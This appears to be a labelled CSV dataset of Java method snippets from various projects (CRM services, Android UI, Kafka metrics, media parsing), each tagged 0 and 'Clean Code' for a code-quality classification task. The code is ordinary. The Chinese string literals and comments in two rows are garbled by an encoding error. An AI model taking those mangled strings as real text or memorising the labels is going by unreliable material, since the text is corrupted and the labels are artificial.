text,label,text_label
"private void setCoreServerInConfig(Config config){
  Server existingServer=config.getRecentCoreServers().stream().filter(server -> coreHost.getText().equals(server.getAlias())).findFirst().orElse(null);
  if (existingServer != null) {
    config.setCoreServer(existingServer);
    return;
  }
  String hostAsString=getHost(coreHost.getText());
  Integer portAsInteger=getPort(corePort.getText());
  if (hostAsString != null && !hostAsString.isEmpty() && portAsInteger != null && isValidPort(portAsInteger)) {
    Protocol protocol=portAsInteger == Protocol.HTTPS.getDefaultPort() ? Protocol.HTTPS : Protocol.HTTP;
    config.setCoreServer(new Server(protocol.toUrlString(hostAsString,portAsInteger)));
  }
 else   if (hostAsString != null && !hostAsString.isEmpty()) {
    config.setCoreServer(new Server(Protocol.HTTP.toUrlString(hostAsString)));
  }
 else {
    config.setCoreServer(null);
  }
}
",0,Clean Code
"private void handlePreambleAddressCode(byte cc1,byte cc2){
  int row=ROW_INDICES[cc1 & 0x07];
  boolean nextRowDown=(cc2 & 0x20) != 0;
  if (nextRowDown) {
    row++;
  }
  if (row != currentCueBuilder.row) {
    if (captionMode != CC_MODE_ROLL_UP && !currentCueBuilder.isEmpty()) {
      currentCueBuilder=new CueBuilder(captionMode,captionRowCount);
      cueBuilders.add(currentCueBuilder);
    }
    currentCueBuilder.row=row;
  }
  boolean isCursor=(cc2 & 0x10) == 0x10;
  boolean underline=(cc2 & 0x01) == 0x01;
  int cursorOrStyle=(cc2 >> 1) & 0x07;
  currentCueBuilder.setStyle(isCursor ? STYLE_UNCHANGED : cursorOrStyle,underline);
  if (isCursor) {
    currentCueBuilder.indent=COLUMN_INDICES[cursorOrStyle];
  }
}",0,Clean Code
"/** 
 * Creates a list that returns every  {@code n}th element of a list, starting at element  {@code k}. <p>It is OK if the list is empty or its size is not a multiple of {@code n}.</p> <p>For instance,  {@code quotientList(list, 2, 0)} returns the evenelements of a list, and  {@code quotientList(list, 2, 1)} returns the oddelements. Those lists are the same length only if list has even size.</p>
 */
public static <E>List<E> quotientList(final List<E> list,final int n,final int k){
  if (n <= 0 || k < 0 || k >= n) {
    throw new IllegalArgumentException(""n must be positive; k must be between 0 and n - 1"");
  }
  final int size=(list.size() + n - k - 1) / n;
  return new AbstractList<E>(){
    public E get(    int index){
      return list.get(index * n + k);
    }
    public int size(){
      return size;
    }
  }
;
}",0,Clean Code
"private Result<ReplicationMetrics> getMetricMessages(VersionItemParam param){
  ReplicationMetricParam metricParam=(ReplicationMetricParam)param;
  String metric=metricParam.getMetric();
  String topic=metricParam.getTopic();
  Long clusterId=metricParam.getClusterPhyId();
  Integer brokerId=metricParam.getBrokerId();
  Integer partitionId=metricParam.getPartitionId();
  Result<ReplicationMetrics> endRet=this.collectReplicaMetricsFromKafka(clusterId,topic,partitionId,brokerId,REPLICATION_METRIC_LOG_END_OFFSET);
  Result<ReplicationMetrics> startRet=this.collectReplicaMetricsFromKafka(clusterId,topic,partitionId,brokerId,REPLICATION_METRIC_LOG_START_OFFSET);
  ReplicationMetrics replicationMetrics=new ReplicationMetrics(clusterId,topic,brokerId,partitionId);
  if (null != endRet && endRet.successful() && null != startRet && startRet.successful()) {
    Float endOffset=endRet.getData().getMetrics().get(REPLICATION_METRIC_LOG_END_OFFSET);
    Float startOffset=startRet.getData().getMetrics().get(REPLICATION_METRIC_LOG_START_OFFSET);
    replicationMetrics.putMetric(metric,endOffset - startOffset);
    replicationMetrics.putMetric(REPLICATION_METRIC_LOG_END_OFFSET,endOffset);
    replicationMetrics.putMetric(REPLICATION_METRIC_LOG_START_OFFSET,startOffset);
  }
  return Result.buildSuc(replicationMetrics);
}
",0,Clean Code
"private static @Nullable ArrayList<Mesh> parseMshp(ParsableByteArray input){
  int version=input.readUnsignedByte();
  if (version != 0) {
    return null;
  }
  input.skipBytes(7);
  int encoding=input.readInt();
  if (encoding == TYPE_DFL8) {
    ParsableByteArray output=new ParsableByteArray();
    Inflater inflater=new Inflater(true);
    try {
      if (!Util.inflate(input,output,inflater)) {
        return null;
      }
    }
  finally {
      inflater.end();
    }
    input=output;
  }
 else   if (encoding != TYPE_RAW) {
    return null;
  }
  return parseRawMshpData(input);
}",0,Clean Code
"protected ColumnImpl(String columnName,int position,int jdbcType,int componentType,String typeName,String typeExpression,String charsetName,String defaultCharsetName,int columnLength,Integer columnScale,boolean optional,boolean autoIncremented,boolean generated){
  this(columnName,position,jdbcType,componentType,typeName,typeExpression,charsetName,defaultCharsetName,columnLength,columnScale,null,optional,autoIncremented,generated,null,false);
}
protected ColumnImpl(String columnName,int position,int jdbcType,int nativeType,String typeName,String typeExpression,String charsetName,String defaultCharsetName,int columnLength,Integer columnScale,boolean optional,boolean autoIncremented,boolean generated,Object defaultValue,boolean hasDefaultValue){
  this(columnName,position,jdbcType,nativeType,typeName,typeExpression,charsetName,defaultCharsetName,columnLength,columnScale,null,optional,autoIncremented,generated,defaultValue,hasDefaultValue);
}
protected ColumnImpl(String columnName,int position,int jdbcType,int nativeType,String typeName,String typeExpression,String charsetName,String defaultCharsetName,int columnLength,Integer columnScale,List<String> enumValues,boolean optional,boolean autoIncremented,boolean generated,Object defaultValue,boolean hasDefaultValue){
  this.name=columnName;
  this.position=position;
  this.jdbcType=jdbcType;
  this.nativeType=nativeType;
  this.typeName=typeName;
  this.typeExpression=typeExpression;
  if (typeUsesCharset() && (charsetName == null || ""DEFAULT"".equalsIgnoreCase(charsetName))) {
    charsetName=defaultCharsetName;
  }
  this.charsetName=charsetName;
  this.length=columnLength;
  this.scale=columnScale;
  this.optional=optional;
  this.autoIncremented=autoIncremented;
  this.generated=generated;
  this.defaultValue=defaultValue;
  this.hasDefaultValue=hasDefaultValue;
  this.enumValues=enumValues == null ? new ArrayList<>() : enumValues;
  assert this.length >= -1;
}",0,Clean Code
"public static void appendExtraViewInfoIntoSp(String extraField){
  final SharedPreferences CodeLocatorConfigIgnoreListSp=sApplication.getSharedPreferences(CodeLocator_CONFIG_IGNORE_LIST_SP,Context.MODE_PRIVATE);
  if (extraField != null && !extraField.isEmpty() && !""_"".equals(extraField)) {
    CodeLocatorConfigIgnoreListSp.edit().putString(""view_extra"",extraField).commit();
  }
 else {
    CodeLocatorConfigIgnoreListSp.edit().putString(""view_extra"","""").commit();
  }
  set=null;
}
",0,Clean Code
"@Override public void onLikeClicked(boolean like){
  if (!mIsMetadataLoaded) {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    getPlayer().setLikeButtonState(!like);
    return;
  }
  if (!YouTubeSignInService.instance().isSigned()) {
    getPlayer().setLikeButtonState(false);
    MessageHelpers.showMessage(getContext(),R.string.msg_signed_users_only);
    return;
  }
  if (like) {
    callMediaItemObservable(mMediaItemService::setLikeObserve);
  }
 else {
    callMediaItemObservable(mMediaItemService::removeLikeObserve);
  }
}
",0,Clean Code
"@Override public void onCreateContextMenu(@NonNull ContextMenu menu,@NonNull View v,@Nullable ContextMenu.ContextMenuInfo menuInfo){
  super.onCreateContextMenu(menu,v,menuInfo);
  Log.d(TAG,""onCreateContextMenu"");
  MenuInflater inflater=requireActivity().getMenuInflater();
  inflater.inflate(R.menu.app_context_menu,menu);
  AppStats stats=mAdapter.getSelectedItem();
  if (stats == null)   return;
  SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(requireContext());
  boolean isBlocked=PCAPdroid.getInstance().getBlocklist().matchesApp(stats.getUid());
  menu.findItem(R.id.block_app).setVisible(!isBlocked);
  if (Prefs.isFirewallWhitelistMode(prefs)) {
    boolean isWhitelisted=PCAPdroid.getInstance().getFirewallWhitelist().matchesApp(stats.getUid());
    menu.findItem(R.id.add_to_fw_whitelist).setVisible(!isWhitelisted);
    menu.findItem(R.id.remove_from_fw_whitelist).setVisible(isWhitelisted);
  }
  menu.findItem(R.id.unblock_app_permanently).setVisible(isBlocked);
  menu.findItem(R.id.unblock_app_10m).setVisible(isBlocked).setTitle(getString(R.string.unblock_for_n_minutes,10));
  menu.findItem(R.id.unblock_app_1h).setVisible(isBlocked).setTitle(getString(R.string.unblock_for_n_hours,1));
  menu.findItem(R.id.unblock_app_8h).setVisible(isBlocked).setTitle(getString(R.string.unblock_for_n_hours,8));
}",0,Clean Code
"/** 
 * @param builder
 */
private ZhipuChatAIStreamClient(Builder builder){
  this.apiKey=builder.apiKey;
  this.key=builder.key;
  this.secret=builder.secret;
  this.apiHost=builder.apiHost;
  this.model=builder.model;
  this.embeddingModel=builder.embeddingModel;
  if (Objects.isNull(builder.okHttpClient)) {
    builder.okHttpClient=this.okHttpClient();
  }
  okHttpClient=builder.okHttpClient;
}
",0,Clean Code
"@Override public void close(){
  uri=null;
  if (multicastSocket != null) {
    try {
      multicastSocket.leaveGroup(address);
    }
 catch (    IOException e) {
    }
    multicastSocket=null;
  }
  if (socket != null) {
    socket.close();
    socket=null;
  }
  address=null;
  socketAddress=null;
  packetRemaining=0;
  if (opened) {
    opened=false;
    transferEnded();
  }
}",0,Clean Code
"@Override public String getAlarmMessage(final double curDurationValue,final double compareToDurationValue,final double changeValue,final AlarmLevel level){
  StringBuilder sb=new StringBuilder();
  sb.append(""褰撳墠"");
  sb.append(TimeUtils.getDurationChineseName(condition.getDuration()));
  sb.append(""鐨�"").append(isDurationGreaterThanCheckInterval() ? ""骞冲潎鍊�"" : ""鍊�"");
  sb.append(String.format(""%.2f"",curDurationValue));
  sb.append(""姣�"");
  sb.append(TimeUtils.getDurationChineseName(condition.getComparedTo()));
  sb.append(""鍓嶇殑"").append(isDurationGreaterThanCheckInterval() ? ""骞冲潎鍊�"" : ""鍊�"");
  sb.append(String.format(""%.2f"",compareToDurationValue));
  if (curDurationValue >= compareToDurationValue) {
    sb.append(""澧為暱浜�"");
  }
 else {
    sb.append(""闄嶄綆浜�"");
  }
  sb.append(String.format(""%.2f"",Math.abs(changeValue))).append(""%"");
  if (AlarmLevel.NORMAL.equals(level)) {
    return sb.toString();
  }
  if (!condition.isMathAbs() && changeValue < 0) {
    sb.append("","").append(String.format(""%.2f"",changeValue)).append(""%"");
  }
  sb.append(condition.getComparator());
  sb.append(""闃堝��"");
  double threshold=condition.getThresholds().get(level);
  sb.append(String.format(""%.2f"",threshold)).append(""%"");
  return sb.toString();
}",0,Clean Code
"/** 
 * 淇敼鑱旂郴浜鸿礋璐ｄ汉
 * @param changeOwnerUserBO 璐熻矗浜哄彉鏇碆O
 */
@Override public void changeOwnerUser(CrmChangeOwnerUserBO changeOwnerUserBO){
  Long newOwnerUserId=changeOwnerUserBO.getOwnerUserId();
  List<Integer> ids=changeOwnerUserBO.getIds();
  if (ids.size() == 0) {
    return;
  }
  for (  Integer id : ids) {
    if (AuthUtil.isChangeOwnerUserAuth(id,CrmEnum.CONTACTS,CrmAuthEnum.EDIT)) {
      throw new CrmException(SystemCodeEnum.SYSTEM_NO_AUTH);
    }
    CrmContacts contacts=getById(id);
    actionRecordUtil.addConversionRecord(id,CrmEnum.CONTACTS,newOwnerUserId,contacts.getName());
    if (2 == changeOwnerUserBO.getTransferType() && !changeOwnerUserBO.getOwnerUserId().equals(contacts.getOwnerUserId())) {
      ApplicationContextHolder.getBean(ICrmTeamMembersService.class).addSingleMember(getLabel(),contacts.getContactsId(),contacts.getOwnerUserId(),changeOwnerUserBO.getPower(),changeOwnerUserBO.getExpiresTime(),contacts.getName());
    }
    ApplicationContextHolder.getBean(ICrmTeamMembersService.class).deleteMember(getLabel(),new CrmMemberSaveBO(id,newOwnerUserId));
  }
  LambdaUpdateWrapper<CrmContacts> wrapper=new LambdaUpdateWrapper<>();
  wrapper.in(CrmContacts::getContactsId,ids);
  wrapper.set(CrmContacts::getOwnerUserId,newOwnerUserId);
  update(wrapper);
  String ownerUserName=UserCacheUtil.getUserName(newOwnerUserId);
  Map<String,Object> map=new HashMap<>();
  map.put(""ownerUserId"",newOwnerUserId);
  map.put(""ownerUserName"",ownerUserName);
  updateField(map,ids);
}",0,Clean Code
"private void checkDone(boolean animated,boolean ignoreClear){
  if (doneButton == null)   return;
  final boolean hasChanges=hasChanges();
  doneButton.setEnabled(hasChanges);
  if (animated) {
    doneButton.animate().alpha(hasChanges ? 1.0f : 0.0f).scaleX(hasChanges ? 1.0f : 0.0f).scaleY(hasChanges ? 1.0f : 0.0f).setDuration(180).start();
  }
 else {
    doneButton.setAlpha(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleX(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleY(hasChanges ? 1.0f : 0.0f);
  }
  if (listView != null && listView.adapter != null && clearVisible != !isEmpty()) {
    saveScrollPosition();
    listView.adapter.update(true);
    applyScrolledPosition();
  }
}",0,Clean Code
"private void loadModpacks(XC_LoadPackage.LoadPackageParam lpParam){
  if (Arrays.asList(ResourceManager.modRes.getStringArray(R.array.root_requirement)).contains(lpParam.packageName)) {
    forceConnectRootService();
  }
  for (  Class<? extends XposedModPack> mod : ModPacks.getMods(lpParam.packageName)) {
    try {
      XposedModPack instance=mod.getConstructor(Context.class).newInstance(mContext);
      if (!instance.listensTo(lpParam.packageName))       continue;
      try {
        instance.updatePrefs();
      }
 catch (      Throwable ignored) {
      }
      instance.handleLoadPackage(lpParam);
      runningMods.add(instance);
    }
 catch (    Throwable T) {
      log(""Start Error Dump - Occurred in "" + mod.getName());
      log(T);
    }
  }
}
",0,Clean Code
"@Override public CrmActivityVO getCrmActivityPageList(CrmActivityBO crmActivity){
  CrmActivityVO activityVO=new CrmActivityVO();
  Integer activityType=crmActivity.getActivityType();
  Integer activityTypeId=crmActivity.getActivityTypeId();
  int page=crmActivity.getPage() - 1;
  Map<String,Object> kv=new HashMap<>();
  kv.put(""activityType"",activityType);
  kv.put(""activityTypeId"",activityTypeId);
  kv.put(""crmType"",crmActivity.getCrmType());
  kv.put(""intervalDay"",crmActivity.getIntervalDay());
  kv.put(""search"",crmActivity.getSearch());
  kv.put(""startDate"",crmActivity.getStartDate());
  kv.put(""endDate"",crmActivity.getEndDate());
  kv.put(""page"",page);
  if (!UserUtil.isAdmin() && !AuthUtil.isReadFollowRecord(crmActivity.getCrmType())) {
    kv.put(""nofollowRecord"",true);
  }
  List<String> times=getBaseMapper().getActivityCountByTime(kv);
  String time=null;
  if (times.size() == 0) {
    activityVO.setList(new ArrayList<>());
  }
 else {
    time=times.get(0);
    kv.remove(""page"");
    kv.put(""time"",time);
    List<CrmActivity> recordList=getBaseMapper().getCrmActivityPageList(kv);
    recordList.forEach(record -> {
      if (record.getType() == 1 || record.getType() == 4) {
        buildActivityRelation(record);
      }
      SimpleUser user=UserCacheUtil.getSimpleUser(record.getCreateUserId());
      record.setUserImg(user.getImg());
      record.setRealname(user.getRealname());
    }
);
    activityVO.setList(recordList);
  }
  activityVO.setTime(time);
  activityVO.setLastPage(times.size() < 2);
  return activityVO;
}",0,Clean Code
